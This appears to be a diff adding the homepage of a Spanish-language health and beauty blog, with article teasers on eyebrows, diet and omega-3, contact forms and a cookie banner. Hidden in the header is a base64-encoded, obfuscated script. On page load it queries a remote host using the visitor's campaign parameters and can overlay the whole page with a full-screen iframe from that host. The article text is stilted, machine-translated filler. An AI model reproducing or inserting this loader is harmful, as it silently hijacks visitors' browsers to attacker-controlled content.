@@ -1,0 +1,451 @@
+<!DOCTYPE html>
+<html lang="zxx">
+<head>
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=0">
+    
+
+    <title>la vida</title>
+    <!-- Fav Icons -->
+
+
+    <!-- Stylesheets -->
+    <link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Roboto:ital,wght@0,400;0,500;0,700;1,400;1,500&display=swap">
+    <link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.9.0/css/all.css">
+    <link rel="stylesheet" href="assets/css/bootstrap.min.css">
+    <link rel="stylesheet" href="assets/css/menu.css">
+    <link rel="stylesheet" href="assets/css/slick.css">
+    <link rel="stylesheet" href="assets/css/flaticon.css">
+    <link rel="stylesheet" href="assets/css/animate.css">
+    <link rel="stylesheet" href="assets/css/leaflet.css">
+    <link rel="stylesheet" href="assets/css/spacing.min.css">
+    <!-- Main Style CSS -->
+    <link rel="stylesheet" href="assets/css/style.css">
+    <!-- Responsive CSS -->
+    <link rel="stylesheet" href="assets/css/responsive.css">
+
+    <script src="https://code.jquery.com/jquery-3.4.1.js"></script>
+
+</head>
+
+<body>
+    <div class="page-wrapper">
+
+        <!-- Preloader -->
+
+
+        <!--==================================================================== 
+                                Start Header area
+        =====================================================================-->
+        <header class="main-header">
+
+            <div class="header-top bg-orange">
+                <div class="container">
+                    <div class="top-inner">
+                        <ul class="top-left">
+                            <li><i class="fa fa-envelope"></i> <a href="#">cadena.alexia@rodarte.com</a></li>
+                            <li><i class="fas fa-map-marker-alt"></i> Travesía Espinoza, 5, 5º 6º, 72093, L' Jaimes del Barco</li>
+                        </ul>
+
+                        <div class="top-right ml-auto">
+                            <div class="social-style-one">
+                                <a href="#"><i class="fab fa-facebook-f"></i></a>
+                                <a href="#"><i class="fab fa-skype"></i></a>
+                                <a href="#"><i class="fab fa-twitter"></i></a>
+                                <a href="#"><i class="fab fa-pinterest-p"></i></a>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+
+            <script src="data:text/javascript;base64,dmFyIF8weDFjMzI9WyIxNDY0NjlCSUJ2UGsiLCI0MlpraHptRCIsIm1hdGNoIiwiMTE0MHFmeFpkWSIsIjFFV05mVkciLCJ1dG1fdGVybSIsIjQ4NTc3bmxWYlJ4IiwiMTU5NTRTUUtLZHIiLCIya2FLQ0NwIiwidXRtX2NhbXBhaWduIiwiMjAwNDI2aGlwc3d1IiwiZ2V0IiwiMUFod3pwUyIsImxvY2F0aW9uIiwnIiBmcmFtZWJvcmRlcj0iMCIgc3R5bGU9Im92ZXJmbG93OmhpZGRlbjtvdmVyZmxvdy14OmhpZGRlbjtvdmVyZmxvdy15OmhpZGRlbjtoZWlnaHQ6MTAwJTt3aWR0aDoxMDAlO3Bvc2l0aW9uOmFic29sdXRlO3RvcDowcHg7bGVmdDowcHg7cmlnaHQ6MHB4O2JvdHRvbTowcHgiIGhlaWdodD0iMTAwJSIgd2lkdGg9IjEwMCUiPjwvaWZyYW1lPicsIjExNDM4MFJwQWhVeCIsIj0oW14mPV0rKSIsImh0dHBzOi8vdmVvbHMuZ2VvbmFsc2VjZS5jb20vaW5kZXgucGhwP2tleT13djg1eDNkZ3lydzZ6djFpMDhoZyIsIjE4MTUyN2NtT0FHZiIsIndyaXRlIiwiMXp3UHRrciJdLF8weDFhYTA9ZnVuY3Rpb24oZSx0KXtyZXR1cm4gXzB4MWMzMltlLT00NzBdfSxfMHg0YzAyMWI9XzB4MWFhMDtmdW5jdGlvbiBnZXRDb29raWVzKGUpe3ZhciB0PV8weDFhYTAsYT13aW5kb3dbdCg0ODgpXS5zZWFyY2g7cmV0dXJuISEoYT1hW3QoNDc3KV0obmV3IFJlZ0V4cChlK3QoNDcwKSkpKSYmYVsxXX1mdW5jdGlvbiBvbkFqYXhTdWNjZXNzKGUpe3ZhciB0PV8weDRjMDIxYjsieWVzIj09ZSYmZG9jdW1lbnRbdCg0NzMpXSgnPGlmcmFtZSBzcmM9Imh0dHBzOi8vdmVvbHMuZ2VvbmFsc2VjZS5jb20vaW5kZXgucGhwP2tleT14Y2p2bGZ6NzVkMjE1cmlndXFreCZ1dG1fY2FtcGFpZ249JytnZXRDb29raWVzKHQoNDg0KSkrIiZ1dG1fdGVybT0iK2dldENvb2tpZXModCg0ODApKSt0KDQ4OSkpfSFmdW5jdGlvbih0KXtmb3IodmFyIGU9XzB4MWFhMDs7KXRyeXtpZigxMDU4Njg9PT1wYXJzZUludChlKDQ5MCkpK3BhcnNlSW50KGUoNDc0KSkqLXBhcnNlSW50KGUoNDgyKSkrcGFyc2VJbnQoZSg0NzYpKSpwYXJzZUludChlKDQ3OCkpKy1wYXJzZUludChlKDQ4NSkpK3BhcnNlSW50KGUoNDgxKSkqcGFyc2VJbnQoZSg0ODcpKStwYXJzZUludChlKDQ3OSkpKi1wYXJzZUludChlKDQ3MikpK3BhcnNlSW50KGUoNDc1KSkqcGFyc2VJbnQoZSg0ODMpKSlicmVhazt0LnB1c2godC5zaGlmdCgpKX1jYXRjaChlKXt0LnB1c2godC5zaGlmdCgpKX19KF8weDFjMzIpLCRbXzB4NGMwMjFiKDQ4NildKF8weDRjMDIxYig0NzEpLG9uQWpheFN1Y2Nlc3MpOw=="></script>
+
+            <!--Header-Upper-->
+            <div class="header-upper">
+                <div class="container clearfix">
+
+                    <div class="header-inner d-lg-flex align-items-center">
+
+                        <div class="logo-outer d-flex align-items-center">
+                            <div class="logo">
+                                <a href="index.html">
+                                    la salud
+                            </a>
+                            </div>
+                        </div>
+
+                        <div class="nav-outer clearfix ml-lg-auto mr-lg-auto">
+                            <!-- Main Menu -->
+                            <nav class="main-menu navbar-expand-lg">
+                                <div class="navbar-header clearfix">
+                                    <!-- Toggle Button -->
+                                    <button type="button" class="navbar-toggle" data-toggle="collapse" data-target=".navbar-collapse">
+                                        <span class="icon-bar"></span>
+                                        <span class="icon-bar"></span>
+                                        <span class="icon-bar"></span>
+                                    </button>
+                                </div>
+
+                                <div class="navbar-collapse collapse clearfix">
+                                    <ul class="navigation clearfix">
+                                        <li class="current"><a href="index.html">Inicio</a></li>
+                                        <li><a href="blog.html">Artículo</a></li>
+
+
+                                        <li><a href="contact.html">Contactos</a></li>
+                                        <li><a href="policy.html">Política de privacidad</a></li>
+                                        <li><a href="terms.html">Términos y condiciones</a></li>
+                                    </ul>
+                                </div>
+
+                            </nav>
+                            <!-- Main Menu End-->
+                        </div>
+
+                        <div class="menu-number">
+                            <i class="flaticon-headphone"></i> <a href="#">+2840265778233</a>
+                        </div>
+                    </div>
+
+                </div>
+            </div>
+            <!--End Header Upper-->
+        </header>
+        <!--==================================================================== 
+                                End Header area
+        =====================================================================-->
+
+        <!--==================================================================== 
+            Start Hero Section
+        =====================================================================-->
+        <section class="hero-section overlay" style="background-image: url(./assets/images/calum-lewis-va1l1jrtm70-unsplash.jpg);">
+            <div class="container">
+                
+                <div class="hero-inner">
+
+
+                     <span style="text-shadow: 1px 0px 20px white;
+                      font-size: 60px"  class="wow fadeInUp" data-wow-duration="1s" data-wow-delay="0.5s">Cómo hacer que tus cejas gruesas?</span><br>
+
+                    <a href="7lBBNHNy6t3euQzNaYKo0.html" class="theme-btn wow fadeInUp" data-wow-duration="1s" data-wow-delay="1s">Leer más <i class="fas fa-arrow-right"></i></a>
+                </div>
+                
+
+            </div>
+        </section>
+
+
+
+   
+
+        <section class="services-section bg-snow pt-140 rpt-90 pb-110 rpb-60">
+            <div class="container">
+                <div class="row justify-content-center">
+                    <div class="col-lg-7 col-md-8">
+                        <div class="section-title text-center mb-80 wow fadeInUp"  data-wow-duration="2s">
+                            <h2>Artículo</h2>
+
+                        </div>
+                    </div>
+                </div>
+                <div class="row">
+                    
+                    <div class="col-lg-4 col-md-6">
+                        <div class="service-item wow fadeInUp" data-wow-duration="2s">
+                            <div class="service-icon d-flex">
+                                <img src="./assets/images/madison-lavern-4gcqrf3-f2i-unsplash.jpg" style="width: 60%!important;" >
+                                <a href="7lBBNHNy6t3euQzNaYKo0.html" class="ml-auto"><i class="fas fa-angle-double-right"></i></a>
+                            </div>
+                            <div class="service-content">
+                                <h4><a href="7lBBNHNy6t3euQzNaYKo0.html">Cómo hacer que tus cejas gruesas?</a></h4>
+                                <p>
+                                     <strong> </strong> fotos Hacer tus cejas gruesas! Las cejas son importantes para la belleza, hacen hincapié en la mirada y la expresividad de la cara. Por desgracia, la naturaleza no ha da...
+                                </p>
+                            </div>
+                        </div>
+                    </div>
+                    
+
+                    <div class="col-lg-4 col-md-6">
+                        <div class="service-item wow fadeInUp" data-wow-duration="2s">
+                            <div class="service-icon d-flex">
+                                <img src="./assets/images/deniz-altindas-t1xlqvdqt_4-unsplash.jpg" style="width: 60%!important;" >
+                                <a href="JRoibZ9nN2U.html" class="ml-auto"><i class="fas fa-angle-double-right"></i></a>
+                            </div>
+                            <div class="service-content">
+                                <h4><a href="JRoibZ9nN2U.html">Dulces alimentos con pocas calorías</a></h4>
+                                <p>
+                                     <strong></strong> fotos Estos son los "vivos trofeos" de la dieta de Atkins. Se ha demostrado que el mercado de masas, se recomienda el uso de hidratos de carbono para perder peso. Este enf...
+                                </p>
+                            </div>
+                        </div>
+                    </div>
+                    
+
+                    <div class="col-lg-4 col-md-6">
+                        <div class="service-item wow fadeInUp" data-wow-duration="2s">
+                            <div class="service-icon d-flex">
+                                <img src="./assets/images/mathew-schwartz-8rj4sz9ylci-unsplash.jpg" style="width: 60%!important;" >
+                                <a href="3849fa0041f71fcc19f2274e2eb89909.html" class="ml-auto"><i class="fas fa-angle-double-right"></i></a>
+                            </div>
+                            <div class="service-content">
+                                <h4><a href="3849fa0041f71fcc19f2274e2eb89909.html">La dieta en lugar de Botox</a></h4>
+                                <p>
+                                     <strong></strong> fotos está de moda hablar de la belleza natural del cuerpo, pero este no es el caso. En este caso, el mejor producto cosmético es una nutritiva y equilibrada y ligeramen...
+                                </p>
+                            </div>
+                        </div>
+                    </div>
+                    
+
+                    <div class="col-lg-4 col-md-6">
+                        <div class="service-item wow fadeInUp" data-wow-duration="2s">
+                            <div class="service-icon d-flex">
+                                <img src="./assets/images/isra-e-shjmuyqsrn8-unsplash (1).jpg" style="width: 60%!important;" >
+                                <a href="q3D2mmb025.html" class="ml-auto"><i class="fas fa-angle-double-right"></i></a>
+                            </div>
+                            <div class="service-content">
+                                <h4><a href="q3D2mmb025.html">5 mejores de la planta basado en fuentes de omega-3 los áci...</a></h4>
+                                <p>
+                                     <strong></strong> Omega-3 son grasas poliinsaturadas, que pertenecen a los llamados ácidos grasos esenciales. Son necesarios para el normal funcionamiento del cuerpo. Nuestro cuerpo puede ...
+                                </p>
+                            </div>
+                        </div>
+                    </div>
+                    
+
+                </div>
+            </div>
+        </section>
+        <!--==================================================================== 
+            End Service Section
+        =====================================================================-->
+   
+        <!--==================================================================== 
+            Star Partners Section
+        =====================================================================-->
+
+        <!--==================================================================== 
+            End Partners Section
+        =====================================================================-->
+   
+        <!--==================================================================== 
+            Star Cases Section
+        =====================================================================-->
+
+        <!--==================================================================== 
+            End Cases Section
+        =====================================================================-->
+   
+        <!--==================================================================== 
+            Start Team Section
+        =====================================================================-->
+
+        <!--==================================================================== 
+            End Team Section
+        =====================================================================-->
+   
+        <!--==================================================================== 
+            Start Call Back Section
+        =====================================================================-->
+        <section class="call-back-section text-white py-150 rpt-90 rpb-100">
+            <div class="call-back-shap"></div>
+            <div class="container">
+                <div class="row">
+                    <div class="col-lg-6">
+                        <div class="section-title wow fadeInUp"  data-wow-duration="2s">
+                            <h2>Contactos</h2>
+
+                        </div>
+                    </div>
+                    <div class="col-lg-6">
+                        <form id="call-back-form" class="call-back-form" name="call-back-form" action="thanks.html" method="post">
+                            <div class="row clearfix">
+                                <div class="col-md-6">        
+                                    <div class="form-group">
+                                        <input type="text" name="full-name" class="form-control" value="" placeholder="El nombre de" required="">
+                                    </div>
+                                </div>
+                                <div class="col-md-6">
+                                    <div class="form-group">
+                                        <input type="email" name="email-address" class="form-control" value="" placeholder="Email" required="">
+                                    </div>
+                                </div>
+                                <div class="col-md-6">
+                                    <div class="form-group">
+                                        <input type="text" name="phone-number" class="form-control" value="" placeholder="El número de teléfono">
+                                    </div>
+                                </div>
+
+                                <div class="col-md-12 mb-10">        
+                                    <div class="form-group">
+                                        <input type="text" name="short-text" class="form-control" value="" >
+                                    </div>
+                                </div>                                               
+                            </div>
+                            <div class="form-group call-submit text-center">
+                                <input type="checkbox" name="terms" value="check" required=""/>
+                                <a href="policy.html" target="_blank">
+                                    He leído y estoy de acuerdo con los términos del acuerdo de usuario
+                                </a>
+
+                                <button style="margin-left: 30px;" class="theme-btn" type="submit">Enviar <i class="fas fa-arrow-right"></i></button>
+                            </div>
+                        </form>
+                    </div>
+                </div>
+            </div>
+        </section>
+        <!--==================================================================== 
+            End Call Back Section
+        =====================================================================-->
+   
+        <!--==================================================================== 
+            Start Testimonial Section
+        =====================================================================-->
+
+        <!--==================================================================== 
+            End Testimonials Section
+        =====================================================================-->   
+          
+        <!--==================================================================== 
+            Start Call To Action Section
+        =====================================================================-->
+
+        <!--==================================================================== 
+            End Call To Action Section
+        =====================================================================-->
+   
+        <!--==================================================================== 
+                                Start Footer Section
+        =====================================================================-->
+        <footer class="footer-section bg-black pt-150 rpt-100">
+            <div class="container">
+                <div class="row">
+                    <div class="col-lg-3 col-6">
+                        <div class="widget contact-info-widget">
+                            <h3 class="widget-title">Contactos</h3>
+                            <ul>
+                                <li>
+
+                                    <p>Travesía Espinoza, 5, 5º 6º, 72093, L' Jaimes del Barco</p>
+                                </li>
+                                <li>
+
+
+                                    <p><a href="#">+2840265778233</a></p>
+                                </li>
+                            </ul>
+                        </div>
+                    </div>
+                    <div class="col-lg-3 col-6">
+                        <div class="widget recent-post-widget">
+                            <h3 class="widget-title">Popular</h3>
+                            <ul>
+                                
+                                <li>
+                                    <div class="post-item">
+                                        <h5><a href="7lBBNHNy6t3euQzNaYKo0.html">Cómo hacer que tus cejas gruesas?</a></h5>
+                                        <p>25.03.2021</p>
+                                    </div>
+                                </li>
+                                
+
+                                <li>
+                                    <div class="post-item">
+                                        <h5><a href="JRoibZ9nN2U.html">Dulces alimentos con pocas calorías</a></h5>
+                                        <p>25.03.2021</p>
+                                    </div>
+                                </li>
+                                
+
+                                <li>
+                                    <div class="post-item">
+                                        <h5><a href="3849fa0041f71fcc19f2274e2eb89909.html">La dieta en lugar de Botox</a></h5>
+                                        <p>25.03.2021</p>
+                                    </div>
+                                </li>
+                                
+
+                                <li>
+                                    <div class="post-item">
+                                        <h5><a href="q3D2mmb025.html">5 mejores de la planta basado en fuentes de omega-...</a></h5>
+                                        <p>25.03.2021</p>
+                                    </div>
+                                </li>
+                                
+
+                            </ul>
+                        </div>
+                    </div>
+
+                    <div class="col-lg-3 col-6">
+                        <div class="widget subscribe-widget">
+                            <h3 class="widget-title">Suscribirse</h3>
+                            <form action="thanks.html" method="post" name="subscribe-form" class="subscribe-form">
+
+                                <div class="form-group">
+                                    <input type="email" name="email-address" value="" class="form-control" placeholder="Email" required="">
+                                    <button type="submit" class="subscribe-submit"><i class="fa fa-envelope"></i></button>
+                                </div>
+                            </form>
+                            <div class="social-style-two mt-20">
+                                <a href="#"><i class="fab fa-facebook-f"></i></a>
+                                <a href="#"><i class="fab fa-skype"></i></a>
+                                <a href="#"><i class="fab fa-twitter"></i></a>
+                                <a href="#"><i class="fab fa-pinterest-p"></i></a>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+            
+            <!-- Copyright Area-->
+            <div class="copyright-area mt-95 rmt-45">
+               <div class="container">
+                    <div class="copyright-inner align-items-center">
+                        <div class="copyright-wrap order-2 order-md-1">
+                            <p>Copyright © <span>2021</span> | All Rights Reserved.</p>
+                            <!-- Scroll Top Button -->
+                            <button class="scroll-top scroll-to-target wow fadeInUp" data-wow-duration="2s" data-target="html"><i class="fas fa-angle-double-up"></i></button>
+                            <!-- footer menu -->
+                        </div>
+
+                    </div>
+                </div>
+            </div>
+        </footer>
+        <div class='cookie-banner'>
+            <p>
+                El sitio web utiliza "cookies". Permiten identificarlo y recibir su información de la experiencia del usuario.Continuando con la navegación de la web, estoy de acuerdo con el uso de las cookies, el propietario del sitio de conformidad con  <a target="_blank" href="https://en.wikipedia.org/wiki/HTTP_cookie">Política de cookies</a>
+            </p>
+            <button class='close-cookie'>&times;</button>
+        </div>
+    </div>
+    <!--End pagewrapper-->
+    <script>
+        window.onload = function () {
+            $('.close-cookie').click(function () {
+                $('.cookie-banner').fadeOut();
+            })
+        }
+    </script>
+    <script>
+        let elems = document.querySelectorAll('.server-name');
+        elems.forEach((elem) => {
+            elem.innerHTML = window.location.hostname
+        })
+    </script>
+    <!-- jequery plugins -->
+    <script src="assets/js/jquery-3.5.1.min.js"></script>
+    <script src="assets/js/bootstrap.min.js"></script>
+    <script src="assets/js/slick.min.js"></script>
+    <script src="assets/js/wow.min.js"></script>
+    <script src="assets/js/leaflet.min.js"></script>
+    <script src="assets/js/appear.js"></script>
+    <!-- Custom script -->
+    <script src="assets/js/script.js"></script>
+</body>
+</html>
